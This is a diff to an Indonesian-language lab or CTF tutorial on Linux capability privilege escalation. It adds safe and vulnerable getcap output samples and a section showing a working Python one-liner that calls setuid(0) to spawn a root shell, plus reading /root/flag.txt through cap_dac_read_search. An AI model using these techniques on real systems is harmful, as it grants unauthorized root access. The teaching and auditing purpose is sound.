@@ -26,15 +26,25 @@
 getcap -r / 2>/dev/null
 ```
 
-Contoh output:
+Tampilan **aman** (tidak ada capability berbahaya):
 
 ```text
-/usr/bin/python3.11 cap_setuid=ep
-/usr/bin/perl cap_setuid=ep
-/usr/bin/ruby cap_setuid=ep
+tester@webserver:~$ getcap -r / 2>/dev/null
+tester@webserver:~$
 ```
 
-> **Perhatikan:** Entry `cap_setuid` pada interpreter (python, perl, ruby, node) adalah **tiket langsung ke root** karena interpreter dapat memanggil `setuid(0)` dari dalam script.
+> Tidak ada output — tidak ada binary dengan capability khusus, konfigurasi bersih.
+
+Tampilan **rentan** (ada capability berbahaya):
+
+```text
+www-data@jobportal:~$ getcap -r / 2>/dev/null
+/usr/bin/python3.11 cap_setuid=ep            ← RENTAN! interpreter bisa setuid(0)
+/usr/bin/perl cap_setuid=ep                  ← RENTAN! interpreter bisa setuid(0)
+/usr/bin/ping cap_net_raw=ep                 ← wajar, ping memang butuh raw socket
+```
+
+> **Perhatikan:** Entry `cap_setuid` pada interpreter (python, perl, ruby, node) adalah **tiket langsung ke root** karena interpreter dapat memanggil `setuid(0)` dari dalam script. Entry seperti `cap_net_raw` pada `ping` adalah konfigurasi **wajar**.
 
 ---
 
@@ -78,6 +88,33 @@ cat /root/flag.txt    # → bisa baca langsung walau bukan root
 | `cp` | `cap_dac_read_search=ep` | Salin berkas apa pun walau bukan root |
 
 > **Catatan:** Capability `cap_setuid` memungkinkan proses **mengubah uid-nya sendiri menjadi 0 (root)** tanpa perlu SUID bit atau sudo — cukup panggil `setuid(0)` dari interpreter (Python/Perl/Ruby/Node) lalu spawn shell. Sementara `cap_dac_read_search` cukup untuk **membaca berkas apa pun** (misal flag) tanpa perlu shell sama sekali.
+
+---
+
+## Langkah 3: Contoh Tampilan Eksploitasi (Root Shell)
+
+```text
+www-data@jobportal:~$ python3 -c 'import os; os.setuid(0); os.execl("/bin/sh","sh")'
+$ id
+uid=0(root) gid=0(root) groups=0(root)
+$ whoami
+root
+$ cat /root/flag.txt
+FLAG{cap_setuid_python_to_root}
+```
+
+> **Capture:** Eksploitasi berhasil — `cap_setuid` memungkinkan Python memanggil `setuid(0)` sehingga shell berjalan penuh sebagai `uid=0(root)` tanpa SUID bit maupun sudo.
+
+Versi tanpa shell untuk `cap_dac_read_search`:
+
+```text
+www-data@jobportal:~$ getcap /usr/bin/cat
+/usr/bin/cat cap_dac_read_search=ep
+www-data@jobportal:~$ cat /root/flag.txt
+FLAG{dac_read_search_no_shell_needed}
+```
+
+> **Capture:** Dengan `cap_dac_read_search`, flag dapat dibaca **langsung tanpa shell** — permission berkas apa pun bisa dilewati.
 
 ---
 
